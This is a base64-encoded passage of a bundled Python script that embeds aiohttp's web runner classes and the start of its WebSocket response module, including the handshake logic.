D0gYXN5bmNpby5nZXRfZXZlbnRfbG9vcCgpXHJcblxyXG4gICAgICAgICMgVGhlIGxvb3Agb3ZlciBzaXRlcyBpcyBpbnRlbnRpb25hbCwgYW4gZXhjZXB0aW9uIG9uIGdhdGhlcigpXHJcbiAgICAgICAgIyBsZWF2ZXMgc2VsZi5fc2l0ZXMgaW4gdW5wcmVkaWN0YWJsZSBzdGF0ZS5cclxuICAgICAgICAjIFRoZSBsb29wIGd1YXJhbnRpZXMgdGhhdCBhIHNpdGUgaXMgZWl0aGVyIGRlbGV0ZWQgb24gc3VjY2VzcyBvclxyXG4gICAgICAgICMgc3RpbGwgcHJlc2VudCBvbiBmYWlsdXJlXHJcbiAgICAgICAgZm9yIHNpdGUgaW4gbGlzdChzZWxmLl9zaXRlcyk6XHJcbiAgICAgICAgICAgIGF3YWl0IHNpdGUuc3RvcCgpXHJcbiAgICAgICAgYXdhaXQgc2VsZi5fY2xlYW51cF9zZXJ2ZXIoKVxyXG4gICAgICAgIHNlbGYuX3NlcnZlciA9IE5vbmVcclxuICAgICAgICBpZiBzZWxmLl9oYW5kbGVfc2lnbmFsczpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgbG9vcC5yZW1vdmVfc2lnbmFsX2hhbmRsZXIoc2lnbmFsLlNJR0lOVClcclxuICAgICAgICAgICAgICAgIGxvb3AucmVtb3ZlX3NpZ25hbF9oYW5kbGVyKHNpZ25hbC5TSUdURVJNKVxyXG4gICAgICAgICAgICBleGNlcHQgTm90SW1wbGVtZW50ZWRFcnJvcjogICMgcHJhZ21hOiBubyBjb3ZlclxyXG4gICAgICAgICAgICAgICAgIyByZW1vdmVfc2lnbmFsX2hhbmRsZXIgaXMgbm90IGltcGxlbWVudGVkIG9uIFdpbmRvd3NcclxuICAgICAgICAgICAgICAgIHBhc3NcclxuXHJcbiAgICBAYWJzdHJhY3RtZXRob2RcclxuICAgIGFzeW5jIGRlZiBfbWFrZV9zZXJ2ZXIoc2VsZikgLT4gU2VydmVyOlxyXG4gICAgICAgIHBhc3MgICMgcHJhZ21hOiBubyBjb3ZlclxyXG5cclxuICAgIEBhYnN0cmFjdG1ldGhvZFxyXG4gICAgYXN5bmMgZGVmIF9jbGVhbnVwX3NlcnZlcihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHBhc3MgICMgcHJhZ21hOiBubyBjb3ZlclxyXG5cclxuICAgIGRlZiBfcmVnX3NpdGUoc2VsZiwgc2l0ZTogQmFzZVNpdGUpIC0+IE5vbmU6XHJcbiAgICAgICAgaWYgc2l0ZSBpbiBzZWxmLl9zaXRlczpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKGYiU2l0ZSB7c2l0ZX0gaXMgYWxyZWFkeSByZWdpc3RlcmVkIGluIHJ1bm5lciB7c2VsZn0iKVxyXG4gICAgICAgIHNlbGYuX3NpdGVzLmFwcGVuZChzaXRlKVxyXG5cclxuICAgIGRlZiBfY2hlY2tfc2l0ZShzZWxmLCBzaXRlOiBCYXNlU2l0ZSkgLT4gTm9uZTpcclxuICAgICAgICBpZiBzaXRlIG5vdCBpbiBzZWxmLl9zaXRlczpcclxuICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKGYiU2l0ZSB7c2l0ZX0gaXMgbm90IHJlZ2lzdGVyZWQgaW4gcnVubmVyIHtzZWxmfSIpXHJcblxyXG4gICAgZGVmIF91bnJlZ19zaXRlKHNlbGYsIHNpdGU6IEJhc2VTaXRlKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNpdGUgbm90IGluIHNlbGYuX3NpdGVzOlxyXG4gICAgICAgICAgICByYWlzZSBSdW50aW1lRXJyb3IoZiJTaXRlIHtzaXRlfSBpcyBub3QgcmVnaXN0ZXJlZCBpbiBydW5uZXIge3NlbGZ9IilcclxuICAgICAgICBzZWxmLl9zaXRlcy5yZW1vdmUoc2l0ZSlcclxuXHJcblxyXG5jbGFzcyBTZXJ2ZXJSdW5uZXIoQmFzZVJ1bm5lcik6XHJcbiAgICAiIiJMb3ctbGV2ZWwgd2ViIHNlcnZlciBydW5uZXIiIiJcclxuXHJcbiAgICBfX3Nsb3RzX18gPSAoIl93ZWJfc2VydmVyIiwpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsIHdlYl9zZXJ2ZXI6IFNlcnZlciwgKiwgaGFuZGxlX3NpZ25hbHM6IGJvb2wgPSBGYWxzZSwgKiprd2FyZ3M6IEFueVxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oaGFuZGxlX3NpZ25hbHM9aGFuZGxlX3NpZ25hbHMsICoqa3dhcmdzKVxyXG4gICAgICAgIHNlbGYuX3dlYl9zZXJ2ZXIgPSB3ZWJfc2VydmVyXHJcblxyXG4gICAgYXN5bmMgZGVmIHNodXRkb3duKHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgcGFzc1xyXG5cclxuICAgIGFzeW5jIGRlZiBfbWFrZV9zZXJ2ZXIoc2VsZikgLT4gU2VydmVyOlxyXG4gICAgICAgIHJldHVybiBzZWxmLl93ZWJfc2VydmVyXHJcblxyXG4gICAgYXN5bmMgZGVmIF9jbGVhbnVwX3NlcnZlcihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIHBhc3NcclxuXHJcblxyXG5jbGFzcyBBcHBSdW5uZXIoQmFzZVJ1bm5lcik6XHJcbiAgICAiIiJXZWIgQXBwbGljYXRpb24gcnVubmVyIiIiXHJcblxyXG4gICAgX19zbG90c19fID0gKCJfYXBwIiwpXHJcblxyXG4gICAgZGVmIF9faW5pdF9fKFxyXG4gICAgICAgIHNlbGYsIGFwcDogQXBwbGljYXRpb24sICosIGhhbmRsZV9zaWduYWxzOiBib29sID0gRmFsc2UsICoqa3dhcmdzOiBBbnlcclxuICAgICkgLT4gTm9uZTpcclxuICAgICAgICBzdXBlcigpLl9faW5pdF9fKGhhbmRsZV9zaWduYWxzPWhhbmRsZV9zaWduYWxzLCAqKmt3YXJncylcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShhcHAsIEFwcGxpY2F0aW9uKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIlRoZSBmaXJzdCBhcmd1bWVudCBzaG91bGQgYmUgd2ViLkFwcGxpY2F0aW9uICJcclxuICAgICAgICAgICAgICAgICJpbnN0YW5jZSwgZ290IHshcn0iLmZvcm1hdChhcHApXHJcbiAgICAgICAgICAgIClcclxuICAgICAgICBzZWxmLl9hcHAgPSBhcHBcclxuXHJcbiAgICBAcHJvcGVydHlcclxuICAgIGRlZiBhcHAoc2VsZikgLT4gQXBwbGljYXRpb246XHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2FwcFxyXG5cclxuICAgIGFzeW5jIGRlZiBzaHV0ZG93bihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuX2FwcC5zaHV0ZG93bigpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9tYWtlX3NlcnZlcihzZWxmKSAtPiBTZXJ2ZXI6XHJcbiAgICAgICAgbG9vcCA9IGFzeW5jaW8uZ2V0X2V2ZW50X2xvb3AoKVxyXG4gICAgICAgIHNlbGYuX2FwcC5fc2V0X2xvb3AobG9vcClcclxuICAgICAgICBzZWxmLl9hcHAub25fc3RhcnR1cC5mcmVlemUoKVxyXG4gICAgICAgIGF3YWl0IHNlbGYuX2FwcC5zdGFydHVwKClcclxuICAgICAgICBzZWxmLl9hcHAuZnJlZXplKClcclxuXHJcbiAgICAgICAgcmV0dXJuIHNlbGYuX2FwcC5fbWFrZV9oYW5kbGVyKGxvb3A9bG9vcCwgKipzZWxmLl9rd2FyZ3MpXHJcblxyXG4gICAgYXN5bmMgZGVmIF9jbGVhbnVwX3NlcnZlcihzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGF3YWl0IHNlbGYuX2FwcC5jbGVhbnVwKClcclxuJykKICAgIF9fc3RpY2t5dGFwZV93cml0ZV9tb2R1bGUoJ2Fpb2h0dHAvd2ViX3dzLnB5JywgYidpbXBvcnQgYXN5bmNpb1xyXG5pbXBvcnQgYmFzZTY0XHJcbmltcG9ydCBiaW5hc2NpaVxyXG5pbXBvcnQgaGFzaGxpYlxyXG5pbXBvcnQganNvblxyXG5mcm9tIHR5cGluZyBpbXBvcnQgQW55LCBJdGVyYWJsZSwgT3B0aW9uYWwsIFR1cGxlLCBjYXN0XHJcblxyXG5pbXBvcnQgYXN5bmNfdGltZW91dFxyXG5pbXBvcnQgYXR0clxyXG5mcm9tIG11bHRpZGljdCBpbXBvcnQgQ0lNdWx0aURpY3RcclxuXHJcbmZyb20gLiBpbXBvcnQgaGRyc1xyXG5mcm9tIC5hYmMgaW1wb3J0IEFic3RyYWN0U3RyZWFtV3JpdGVyXHJcbmZyb20gLmhlbHBlcnMgaW1wb3J0IGNhbGxfbGF0ZXIsIHNldF9yZXN1bHRcclxuZnJvbSAuaHR0cCBpbXBvcnQgKFxyXG4gICAgV1NfQ0xPU0VEX01FU1NBR0UsXHJcbiAgICBXU19DTE9TSU5HX01FU1NBR0UsXHJcbiAgICBXU19LRVksXHJcbiAgICBXZWJTb2NrZXRFcnJvcixcclxuICAgIFdlYlNvY2tldFJlYWRlcixcclxuICAgIFdlYlNvY2tldFdyaXRlcixcclxuICAgIFdTQ2xvc2VDb2RlLFxyXG4gICAgV1NNZXNzYWdlLFxyXG4gICAgV1NNc2dUeXBlIGFzIFdTTXNnVHlwZSxcclxuICAgIHdzX2V4dF9nZW4sXHJcbiAgICB3c19leHRfcGFyc2UsXHJcbilcclxuZnJvbSAubG9nIGltcG9ydCB3c19sb2dnZXJcclxuZnJvbSAuc3RyZWFtcyBpbXBvcnQgRW9mU3RyZWFtLCBGbG93Q29udHJvbERhdGFRdWV1ZVxyXG5mcm9tIC50eXBlZGVmcyBpbXBvcnQgRmluYWwsIEpTT05EZWNvZGVyLCBKU09ORW5jb2RlclxyXG5mcm9tIC53ZWJfZXhjZXB0aW9ucyBpbXBvcnQgSFRUUEJhZFJlcXVlc3QsIEhUVFBFeGNlcHRpb25cclxuZnJvbSAud2ViX3JlcXVlc3QgaW1wb3J0IEJhc2VSZXF1ZXN0XHJcbmZyb20gLndlYl9yZXNwb25zZSBpbXBvcnQgU3RyZWFtUmVzcG9uc2VcclxuXHJcbl9fYWxsX18gPSAoXHJcbiAgICAiV2ViU29ja2V0UmVzcG9uc2UiLFxyXG4gICAgIldlYlNvY2tldFJlYWR5IixcclxuICAgICJXU01zZ1R5cGUiLFxyXG4pXHJcblxyXG5USFJFU0hPTERfQ09OTkxPU1RfQUNDRVNTOiBGaW5hbFtpbnRdID0gNVxyXG5cclxuXHJcbkBhdHRyLnMoYXV0b19hdHRyaWJzPVRydWUsIGZyb3plbj1UcnVlLCBzbG90cz1UcnVlKVxyXG5jbGFzcyBXZWJTb2NrZXRSZWFkeTpcclxuICAgIG9rOiBib29sXHJcbiAgICBwcm90b2NvbDogT3B0aW9uYWxbc3RyXVxyXG5cclxuICAgIGRlZiBfX2Jvb2xfXyhzZWxmKSAtPiBib29sOlxyXG4gICAgICAgIHJldHVybiBzZWxmLm9rXHJcblxyXG5cclxuY2xhc3MgV2ViU29ja2V0UmVzcG9uc2UoU3RyZWFtUmVzcG9uc2UpOlxyXG5cclxuICAgIF9sZW5ndGhfY2hlY2sgPSBGYWxzZVxyXG5cclxuICAgIGRlZiBfX2luaXRfXyhcclxuICAgICAgICBzZWxmLFxyXG4gICAgICAgICosXHJcbiAgICAgICAgdGltZW91dDogZmxvYXQgPSAxMC4wLFxyXG4gICAgICAgIHJlY2VpdmVfdGltZW91dDogT3B0aW9uYWxbZmxvYXRdID0gTm9uZSxcclxuICAgICAgICBhdXRvY2xvc2U6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIGF1dG9waW5nOiBib29sID0gVHJ1ZSxcclxuICAgICAgICBoZWFydGJlYXQ6IE9wdGlvbmFsW2Zsb2F0XSA9IE5vbmUsXHJcbiAgICAgICAgcHJvdG9jb2xzOiBJdGVyYWJsZVtzdHJdID0gKCksXHJcbiAgICAgICAgY29tcHJlc3M6IGJvb2wgPSBUcnVlLFxyXG4gICAgICAgIG1heF9tc2dfc2l6ZTogaW50ID0gNCAqIDEwMjQgKiAxMDI0LFxyXG4gICAgKSAtPiBOb25lOlxyXG4gICAgICAgIHN1cGVyKCkuX19pbml0X18oc3RhdHVzPTEwMSlcclxuICAgICAgICBzZWxmLl9wcm90b2NvbHMgPSBwcm90b2NvbHNcclxuICAgICAgICBzZWxmLl93c19wcm90b2NvbCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbc3RyXVxyXG4gICAgICAgIHNlbGYuX3dyaXRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbV2ViU29ja2V0V3JpdGVyXVxyXG4gICAgICAgIHNlbGYuX3JlYWRlciA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbRmxvd0NvbnRyb2xEYXRhUXVldWVbV1NNZXNzYWdlXV1cclxuICAgICAgICBzZWxmLl9jbG9zZWQgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX2Nsb3NpbmcgPSBGYWxzZVxyXG4gICAgICAgIHNlbGYuX2Nvbm5fbG9zdCA9IDBcclxuICAgICAgICBzZWxmLl9jbG9zZV9jb2RlID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFtpbnRdXHJcbiAgICAgICAgc2VsZi5fbG9vcCA9IE5vbmUgICMgdHlwZTogT3B0aW9uYWxbYXN5bmNpby5BYnN0cmFjdEV2ZW50TG9vcF1cclxuICAgICAgICBzZWxmLl93YWl0aW5nID0gTm9uZSAgIyB0eXBlOiBPcHRpb25hbFthc3luY2lvLkZ1dHVyZVtib29sXV1cclxuICAgICAgICBzZWxmLl9leGNlcHRpb24gPSBOb25lICAjIHR5cGU6IE9wdGlvbmFsW0Jhc2VFeGNlcHRpb25dXHJcbiAgICAgICAgc2VsZi5fdGltZW91dCA9IHRpbWVvdXRcclxuICAgICAgICBzZWxmLl9yZWNlaXZlX3RpbWVvdXQgPSByZWNlaXZlX3RpbWVvdXRcclxuICAgICAgICBzZWxmLl9hdXRvY2xvc2UgPSBhdXRvY2xvc2VcclxuICAgICAgICBzZWxmLl9hdXRvcGluZyA9IGF1dG9waW5nXHJcbiAgICAgICAgc2VsZi5faGVhcnRiZWF0ID0gaGVhcnRiZWF0XHJcbiAgICAgICAgc2VsZi5faGVhcnRiZWF0X2NiOiBPcHRpb25hbFthc3luY2lvLlRpbWVySGFuZGxlXSA9IE5vbmVcclxuICAgICAgICBpZiBoZWFydGJlYXQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3BvbmdfaGVhcnRiZWF0ID0gaGVhcnRiZWF0IC8gMi4wXHJcbiAgICAgICAgc2VsZi5fcG9uZ19yZXNwb25zZV9jYjogT3B0aW9uYWxbYXN5bmNpby5UaW1lckhhbmRsZV0gPSBOb25lXHJcbiAgICAgICAgc2VsZi5fY29tcHJlc3MgPSBjb21wcmVzc1xyXG4gICAgICAgIHNlbGYuX21heF9tc2dfc2l6ZSA9IG1heF9tc2dfc2l6ZVxyXG5cclxuICAgIGRlZiBfY2FuY2VsX2hlYXJ0YmVhdChzZWxmKSAtPiBOb25lOlxyXG4gICAgICAgIGlmIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2IgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2IuY2FuY2VsKClcclxuICAgICAgICAgICAgc2VsZi5fcG9uZ19yZXNwb25zZV9jYiA9IE5vbmVcclxuXHJcbiAgICAgICAgaWYgc2VsZi5faGVhcnRiZWF0X2NiIGlzIG5vdCBOb25lOlxyXG4gICAgICAgICAgICBzZWxmLl9oZWFydGJlYXRfY2IuY2FuY2VsKClcclxuICAgICAgICAgICAgc2VsZi5faGVhcnRiZWF0X2NiID0gTm9uZVxyXG5cclxuICAgIGRlZiBfcmVzZXRfaGVhcnRiZWF0KHNlbGYpIC0+IE5vbmU6XHJcbiAgICAgICAgc2VsZi5fY2FuY2VsX2hlYXJ0YmVhdCgpXHJcblxyXG4gICAgICAgIGlmIHNlbGYuX2hlYXJ0YmVhdCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgYXNzZXJ0IHNlbGYuX2xvb3AgaXMgbm90IE5vbmVcclxuICAgICAgICAgICAgc2VsZi5faGVhcnRiZWF0X2NiID0gY2FsbF9sYXRlcihcclxuICAgICAgICAgICAgICAgIHNlbGYuX3NlbmRfaGVhcnRiZWF0LCBzZWxmLl9oZWFydGJlYXQsIHNlbGYuX2xvb3BcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfc2VuZF9oZWFydGJlYXQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9oZWFydGJlYXQgaXMgbm90IE5vbmUgYW5kIG5vdCBzZWxmLl9jbG9zZWQ6XHJcbiAgICAgICAgICAgIGFzc2VydCBzZWxmLl9sb29wIGlzIG5vdCBOb25lXHJcbiAgICAgICAgICAgICMgZmlyZS1hbmQtZm9yZ2V0IGEgdGFzayBpcyBub3QgcGVyZmVjdCBidXQgbWF5YmUgb2sgZm9yXHJcbiAgICAgICAgICAgICMgc2VuZGluZyBwaW5nLiBPdGhlcndpc2Ugd2UgbmVlZCBhIGxvbmctbGl2aW5nIGhlYXJ0YmVhdFxyXG4gICAgICAgICAgICAjIHRhc2sgaW4gdGhlIGNsYXNzLlxyXG4gICAgICAgICAgICBzZWxmLl9sb29wLmNyZWF0ZV90YXNrKHNlbGYuX3dyaXRlci5waW5nKCkpICAjIHR5cGU6IGlnbm9yZVt1bmlvbi1hdHRyXVxyXG5cclxuICAgICAgICAgICAgaWYgc2VsZi5fcG9uZ19yZXNwb25zZV9jYiBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgICAgIHNlbGYuX3BvbmdfcmVzcG9uc2VfY2IuY2FuY2VsKClcclxuICAgICAgICAgICAgc2VsZi5fcG9uZ19yZXNwb25zZV9jYiA9IGNhbGxfbGF0ZXIoXHJcbiAgICAgICAgICAgICAgICBzZWxmLl9wb25nX25vdF9yZWNlaXZlZCwgc2VsZi5fcG9uZ19oZWFydGJlYXQsIHNlbGYuX2xvb3BcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgIGRlZiBfcG9uZ19ub3RfcmVjZWl2ZWQoc2VsZikgLT4gTm9uZTpcclxuICAgICAgICBpZiBzZWxmLl9yZXEgaXMgbm90IE5vbmUgYW5kIHNlbGYuX3JlcS50cmFuc3BvcnQgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHNlbGYuX2Nsb3NlZCA9IFRydWVcclxuICAgICAgICAgICAgc2VsZi5fY2xvc2VfY29kZSA9IFdTQ2xvc2VDb2RlLkFCTk9STUFMX0NMT1NVUkVcclxuICAgICAgICAgICAgc2VsZi5fZXhjZXB0aW9uID0gYXN5bmNpby5UaW1lb3V0RXJyb3IoKVxyXG4gICAgICAgICAgICBzZWxmLl9yZXEudHJhbnNwb3J0LmNsb3NlKClcclxuXHJcbiAgICBhc3luYyBkZWYgcHJlcGFyZShzZWxmLCByZXF1ZXN0OiBCYXNlUmVxdWVzdCkgLT4gQWJzdHJhY3RTdHJlYW1Xcml0ZXI6XHJcbiAgICAgICAgIyBtYWtlIHByZS1jaGVjayB0byBkb25cJ3QgaGlkZSBpdCBieSBkb19oYW5kc2hha2UoKSBleGNlcHRpb25zXHJcbiAgICAgICAgaWYgc2VsZi5fcGF5bG9hZF93cml0ZXIgaXMgbm90IE5vbmU6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmLl9wYXlsb2FkX3dyaXRlclxyXG5cclxuICAgICAgICBwcm90b2NvbCwgd3JpdGVyID0gc2VsZi5fcHJlX3N0YXJ0KHJlcXVlc3QpXHJcbiAgICAgICAgcGF5bG9hZF93cml0ZXIgPSBhd2FpdCBzdXBlcigpLnByZXBhcmUocmVxdWVzdClcclxuICAgICAgICBhc3NlcnQgcGF5bG9hZF93cml0ZXIgaXMgbm90IE5vbmVcclxuICAgICAgICBzZWxmLl9wb3N0X3N0YXJ0KHJlcXVlc3QsIHByb3RvY29sLCB3cml0ZXIpXHJcbiAgICAgICAgYXdhaXQgcGF5bG9hZF93cml0ZXIuZHJhaW4oKVxyXG4gICAgICAgIHJldHVybiBwYXlsb2FkX3dyaXRlclxyXG5cclxuICAgIGRlZiBfaGFuZHNoYWtlKFxyXG4gICAgICAgIHNlbGYsIHJlcXVlc3Q6IEJhc2VSZXF1ZXN0XHJcbiAgICApIC0+IFR1cGxlWyJDSU11bHRpRGljdFtzdHJdIiwgc3RyLCBib29sLCBib29sXTpcclxuICAgICAgICBoZWFkZXJzID0gcmVxdWVzdC5oZWFkZXJzXHJcbiAgICAgICAgaWYgIndlYnNvY2tldCIgIT0gaGVhZGVycy5nZXQoaGRycy5VUEdSQURFLCAiIikubG93ZXIoKS5zdHJpcCgpOlxyXG4gICAgICAgICAgICByYWlzZSBIVFRQQmFkUmVxdWVzdChcclxuICAgICAgICAgICAgICAgIHRleHQ9KFxyXG4gICAgICAgICAgICAgICAgICAgICJObyBXZWJTb2NrZXQgVVBHUkFERSBoZHI6IHt9XFxuIENhbiAiXHJcbiAgICAgICAgICAgICAgICAgICAgXCciVXBncmFkZSIgb25seSB0byAiV2ViU29ja2V0Ii5cJ1xyXG4gICAgICAgICAgICAgICAgKS5mb3JtYXQoaGVhZGVycy5nZXQoaGRycy5VUEdSQURFKSlcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICBpZiAidXBncmFkZSIgbm90IGluIGhlYWRlcnMuZ2V0KGhkcnMuQ09OTkVDVElPTiwgIiIpLmxvd2VyKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIEhUVFBCYWRSZXF1ZXN0KFxyXG4gICAgICAgICAgICAgICAgdGV4dD0iTm8gQ09OTkVDVElPTiB1cGdyYWRlIGhkcjoge30iLmZvcm1hdChcclxuICAgICAgICAgICAgICAgICAgICBoZWFkZXJzLmdldChoZHJzLkNPTk5FQ1RJT04pXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBmaW5kIGNvbW1vbiBzdWItcHJvdG9jb2wgYmV0d2VlbiBjbGllbnQgYW5kIHNlcnZlclxyXG4gICAgICAgIHByb3RvY29sID0gTm9uZVxyXG4gICAgICAgIGlmIGhkcnMuU0VDX1dFQlNPQ0tFVF9QUk9UT0NPTCBpbiBoZWFkZXJzOlxyXG4gICAgICAgICAgICByZXFfcHJvdG9jb2xzID0gW1xyXG4gICAgICAgICAgICAgICAgc3RyKHByb3RvLnN0cmlwKCkpXHJcbiAgICAgICAgICAgICAgICBmb3IgcHJvdG8gaW4gaGVhZGVyc1toZHJzLlNFQ19XRUJTT0NLRVRfUFJPVE9DT0xdLnNwbGl0KCIsIilcclxuICAgICAgICAgICAgXVxyXG5cclxuICAgICAgICAgICAgZm9yIHByb3RvIGluIHJlcV9wcm90b2NvbHM6XHJcbiAgICAgICAgICAgICAgICBpZiBwcm90byBpbiBzZWxmLl9wcm90b2NvbHM6XHJcbiAgICAgICAgICAgICAgICAgICAgcHJvdG9jb2wgPSBwcm90b1xyXG4gICAgICAgICAgICAgICAgICAgIGJyZWFrXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICAjIE5vIG92ZXJsYXAgZm91bmQ6IFJldHVybiBubyBwcm90b2NvbCBhcyBwZXIgc3BlY1xyXG4gICAgICAgICAgICAgICAgd3NfbG9nZ2VyLndhcm5pbmcoXHJcbiAgICAgICAgICAgICAgICAgICAgIkNsaWVudCBwcm90b2NvbHMgJXIgZG9uXHhlMlx4ODBceDk5dCBvdmVybGFwIHNlcnZlci1rbm93biBvbmVzICVyIixcclxuICAgICAgICAgICAgICAgICAgICByZXFfcHJvdG9jb2xzLFxyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuX3Byb3RvY29scyxcclxuICAgICAgICAgICAgICAgIClcclxuXHJcbiAgICAgICAgIyBjaGVjayBzdXBwb3J0ZWQgdmVyc2lvblxyXG4gICAgICAgIHZlcnNpb24gPSBoZWFkZXJzLmdldChoZHJzLlNFQ19XRUJTT0NLRVRfVkVSU0lPTiwgIiIpXHJcbiAgICAgICAgaWYgdmVyc2lvbiBub3QgaW4gKCIxMyIsICI4IiwgIjciKTpcclxuICAgICAgICAgICAgcmFpc2UgSFRUUEJhZFJlcXVlc3QodGV4dD1mIlVuc3VwcG9ydGVkIHZlcnNpb246IHt2ZXJzaW9ufSIpXHJcblxyXG4gICAgICAgICMgY2hlY2sgY2xpZW50IGhhbmRzaGFrZSBmb3IgdmFsaWRpdHlcclxuICAgICAgICBrZXkgPSBoZWFkZXJzLmdldChoZHJzLlNFQ19XRUJTT0NLRVRfS0VZKVxyXG4gICAgICAgIHRyeTpcclxuICAgICAgICAgICAgaWYgbm90IGtleSBvciBsZW4oYmFzZTY0LmI2NGRlY29kZShrZXkpKSAhPSAxNjpcclxuICAgICAgICAgICAgICAgIHJhaXNlIEhUVFBCYWRSZXF1ZXN0KHRleHQ9ZiJIYW5kc2hha2UgZXJyb3I6IHtrZXkhcn0iKVxyXG4gICAgICAgIGV4Y2VwdCBiaW5hc2NpaS5FcnJvcjpcclxuICAgICAgICAgICAgcmFpc2UgSFRUUEJhZFJlcXVlc3QodGV4dD1mIkhhbmRzaGFrZSBlcnJvcjoge2tleSFyfSIpIGZyb20gTm9uZVxyXG5cclxuICAgICAgICBhY2NlcHRfdmFsID0gYmFzZTY0LmI2NGVuY29kZShcclxuICAgICAgICAgICAgaGFzaGxpYi5zaGExKGtleS5lbmNvZGUoKSArIFdTX0tFWSkuZGlnZXN0KClcclxuICAgICAgICApLmRlY29kZSgpXHJcbiAgICAgICAgcmVzcG9uc2VfaGVhZGVycyA9IENJTXVsdGlEaWN0KCAgIyB0eXBlOiBpZ25vcmVbdmFyLWFubm90YXRlZF1cclxuICAgICAgICAgICAge1xyXG4gICAgICAgICAgICAgICAgaGRycy5VUEdSQURFOiAid2Vic29ja2V0IiwgICMgdHlwZTogaWdub3JlW2FyZy10eXBlXVxyXG4gICAgICAgICAgICAgICAgaGRycy5DT05ORUNUSU9OOiAidXBncmFkZSIsXHJcbiAgICAgICAgICAgICAgICBoZHJzLlNFQ19XRUJTT0NLRVRfQUNDRVBUOiBhY2NlcHRfdmFsLFxyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgKVxyXG5cclxuICAgICAgICBub3Rha2VvdmVyID0gRmFsc2VcclxuICAgICAgICBjb21wcmVzcyA9IDBcclxuICAgICAgICBpZiBzZWxmLl9jb21wcmVzczpcclxuICAgICAgICAgICAgZXh0ZW5zaW9ucyA9IGhlYWRlcnMuZ2V0KGhkcnMuU0VDX1dFQlNPQ0tFVF9FWFRFTlNJT05TKVxyXG4gICAgICAgICAgICAjIFNlcnZlciBzaWRlIGFsd2F5cyBnZXQgcmV0dXJuIHdpdGggbm8gZXhjZXB0aW9uLlxyXG4gICAgICAgICAgICAjIElmIHNvbWV0aGluZyBoYXBwZW5lZCwganVzdCBkcm9wIGNvbXByZXNzIGV4dGVuc2lvblxyXG4gICAgICAgICAgICBjb21wcmVzcywgbm90YWtlb3ZlciA9IHdzX2V4dF9wYXJzZShleHRlbnNpb25zLCBpc3NlcnZlcj1UcnVlKVxyXG4gICAgICAgICAgICBpZiBjb21wcmVzczpcclxuICAgICAgICAgICAgICAgIGVuYWJsZWRleHQgPSB3c19leHRfZ2VuKFxyXG4gICAgICAgICAgICAgICAgICAgIGNvbXByZXNzPWNvbXByZXNzLCBpc3NlcnZlcj1UcnVlLCBzZXJ2ZXJfbm90YWtlb3Zlcj1ub3Rha2VvdmVyXHJcbiAgICAgICAgICAgICAgICApXHJcbiAgICAgICAgICAgICAgICByZXNwb25zZV9oZWFkZXJzW2hkcnMuU0VDX1dFQlNPQ0tFVF9FWFRFTlNJT05TXSA9IGVuYWJsZWRleHRcclxuXHJcbiAgICAgICAgaWYgcHJvdG9jb2w6XHJcbiAgICAgICAgICAgIHJlc3BvbnNlX2hlYWRlcnNbaGRycy5TRUNfV0VCU09DS0VUX1BST1RPQ09MXSA9IHByb3RvY29sXHJcbiAgICAgICAgcmV0dXJuIChcclxuICAgICAgICAgICAgcmVzcG9uc2VfaGVhZGVycyxcclxuICAgICAgICAgICAgcHJvdG9jb2wsXHJcbiAgICAgICAgICAgIGNvbXByZXNzLFxyXG4gICAgICAgICAgICBub3Rha2VvdmVyLFxyXG4gICAgICAgICkgICMgdHlwZTogaWdub3JlW3JldHVybi12YWx1ZV1cclxuXHJcbiAgICBkZWYgX3ByZV9zdGFydChzZWxmLCByZXF1ZXN0OiBCYXNlUmVxdWVzdCkgLT4gVHVwbGVbc3RyLCBXZWJTb2NrZXRXcml0ZXJdOlxyXG4gICAgICAgIHNlbGYuX2xvb3AgPSByZXF1ZXN0Ll9sb29wXHJcblxyXG4gICAgICAgIGhlYWRlcnMsIHByb3RvY29sLCBjb21wcmVzcywgbm90YWtlb3ZlciA9IHNlbGYuX2hhbmRzaGFrZShyZXF1ZXN0KVxyXG5cclxuICAgICAgICBzZWxmLnNldF9zdGF0dXMoMTAxKVxyXG4gICAgICAgIHNlbGYuaGVhZGVycy51cGRhdGUoaGVhZGVycylcclxuICAgICAgICBzZWxmLmZvcmNlX2Nsb3NlKClcclxuICAgI